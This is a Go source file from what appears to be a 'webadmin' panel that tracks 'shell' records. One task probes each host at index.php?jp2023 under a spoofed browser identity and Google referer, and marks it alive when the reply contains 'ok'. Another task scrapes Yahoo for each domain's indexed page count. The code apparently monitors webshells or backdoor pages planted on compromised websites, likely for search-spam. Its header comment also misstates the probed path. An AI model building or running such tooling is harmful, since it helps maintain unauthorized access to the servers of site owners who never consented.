package task

import (
	"fmt"
	"log"
	"regexp"
	"strconv"
	"strings"
	"time"

	"webadmin/model"

	"github.com/gocolly/colly/v2"
)

// Sitestatus queries all shell records, visits scheme://host/jp2023 for each,
// and sets Status=1 if the response body contains "ok", otherwise Status=2.
// Uses colly async mode with parallel goroutines.
func Sitestatus() {
	time.Sleep(10 * time.Second) // delay start to allow server to initialize
	var shells []model.Shell
	if err := model.Db.Where("status = 1").Find(&shells).Error; err != nil {
		log.Printf("Sitestatus: failed to query shells: %v", err)
		return
	}

	log.Printf("Sitestatus: %d records to check", len(shells))

	c := colly.NewCollector(
		colly.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
		colly.Async(true),
	)
	c.SetRequestTimeout(15 * time.Second)
	c.OnRequest(func(r *colly.Request) {
		r.Headers.Set("Referer", "https://www.google.com/")
		r.Headers.Set("Accept-Language", "en-US,en;q=0.9")
		r.Headers.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	})

	// limit concurrency to 10 parallel requests
	if err := c.Limit(&colly.LimitRule{
		DomainGlob:  "*",
		Parallelism: 10,
	}); err != nil {
		log.Printf("Sitestatus: failed to set limit: %v", err)
		return
	}

	c.OnResponse(func(r *colly.Response) {
		shellID := r.Ctx.GetAny("shellId").(int)
		bodyOk := strings.Contains(string(r.Body), "ok")

		newStatus := 2
		if bodyOk {
			newStatus = 1
		}

		if err := model.Db.Model(&model.Shell{}).Where("id = ?", shellID).Update("status", newStatus).Error; err != nil {
			log.Printf("Sitestatus: update failed id=%d: %v", shellID, err)
		}
	})

	c.OnError(func(r *colly.Response, err error) {
		if r != nil {
			shellID := r.Ctx.GetAny("shellId").(int)
			log.Printf("Sitestatus: request failed id=%d %s: %v", shellID, r.Request.URL, err)
			// set status=5 for failed requests
			if err := model.Db.Model(&model.Shell{}).Where("id = ?", shellID).Update("status", 5).Error; err != nil {
				log.Printf("Sitestatus: update failed id=%d: %v", shellID, err)
			}
		}
	})

	for _, shell := range shells {
		host := strings.TrimSpace(shell.Host)
		scheme := strings.TrimSpace(shell.Scheme)
		if host == "" || scheme == "" {
			log.Printf("Sitestatus: skip id=%d, empty host or scheme", shell.Id)
			continue
		}

		url := fmt.Sprintf("%s://%s/index.php?jp2023", scheme, host)
		ctx := colly.NewContext()
		ctx.Put("shellId", shell.Id)

		if err := c.Request("GET", url, nil, ctx, nil); err != nil {
			log.Printf("Sitestatus: visit failed id=%d %s: %v", shell.Id, url, err)
		}
	}

	c.Wait()
}

// SiteTask queries all shell records, fetches Yahoo site:domain inclusion count,
// and updates the sitenum field for each record.
func SiteTask() {
	var shells []model.Shell
	if err := model.Db.Find(&shells).Error; err != nil {
		log.Printf("SiteTask: failed to query shells: %v", err)
		return
	}

	log.Printf("SiteTask: %d records to process", len(shells))

	c := colly.NewCollector(
		colly.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
	)
	c.SetRequestTimeout(20 * time.Second)

	var sitenum int
	c.OnHTML("body", func(e *colly.HTMLElement) {
		text := e.Text
		sitenum = parseYahooResultCount(text)
	})

	c.OnError(func(r *colly.Response, err error) {
		log.Printf("SiteTask: request failed %s: %v", r.Request.URL, err)
	})

	for _, shell := range shells {
		host := strings.TrimSpace(shell.Host)
		if host == "" {
			continue
		}
		// strip www. prefix for domain-level query
		domain := strings.TrimPrefix(host, "www.")

		sitenum = 0
		url := fmt.Sprintf("https://search.yahoo.com/search?p=site:%s&n=10", domain)
		if err := c.Visit(url); err != nil {
			log.Printf("SiteTask: yahoo visit failed %s: %v", domain, err)
			continue
		}

		if err := model.Db.Model(&model.Shell{}).Where("id = ?", shell.Id).Update("sitenum", sitenum).Error; err != nil {
			log.Printf("SiteTask: update failed %s (id=%d): %v", domain, shell.Id, err)
		} else {
			log.Printf("SiteTask: updated %s (id=%d) sitenum=%d", domain, shell.Id, sitenum)
		}

		// rate-limit: be polite to Yahoo
		time.Sleep(3 * time.Second)
	}
}

// parseYahooResultCount extracts the result count from Yahoo search page HTML text.
// Matches patterns like "About 12,400 results", "12,400 results", "12,400 search results".
func parseYahooResultCount(body string) int {
	re := regexp.MustCompile(`(?i)(?:about\s+)?([\d,]+)\s+(?:search\s+)?results?`)
	matches := re.FindStringSubmatch(body)
	if len(matches) < 2 {
		return 0
	}
	numStr := strings.ReplaceAll(matches[1], ",", "")
	n, err := strconv.Atoi(numStr)
	if err != nil {
		return 0
	}
	return n
}
